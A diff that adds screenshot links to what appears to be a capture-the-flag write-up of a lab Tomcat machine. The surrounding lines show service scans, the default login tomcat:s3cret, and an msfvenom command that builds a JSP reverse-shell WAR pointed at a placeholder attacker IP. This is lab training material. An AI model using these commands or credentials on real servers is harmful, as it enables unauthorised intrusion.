@@ -27,6 +27,8 @@ on Windows.
 nmap -sV 10.10.10.95
 ```
 
+![nmap service scan](./assets/jerry/01-nmap.png)
+
 A single open port, 8080, running Apache Tomcat/Coyote. Running `nikto`
 against it surfaced the manager application path and flagged working
 default credentials directly:
@@ -34,6 +36,8 @@ default credentials directly:
 ```bash
 nikto -h https://10.10.10.95:8080
 ```
+
+![Metasploit brute-forcing the Tomcat manager login](./assets/jerry/02-tomcat-mgr-login-bruteforce.png)
 
 The `/manager/html` path accepted `tomcat:s3cret` — a documented Tomcat
 default, unchanged. Verified independently with Metasploit's
@@ -52,6 +56,8 @@ shell:
 ```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=5555 -f war > shell.war
 ```
+
+![deploying the malicious WAR through the manager interface](./assets/jerry/03-war-shell-deploy.png)
 
 Uploading it through the authenticated manager interface and browsing to the
 deployed application triggered the payload, returning a shell running as
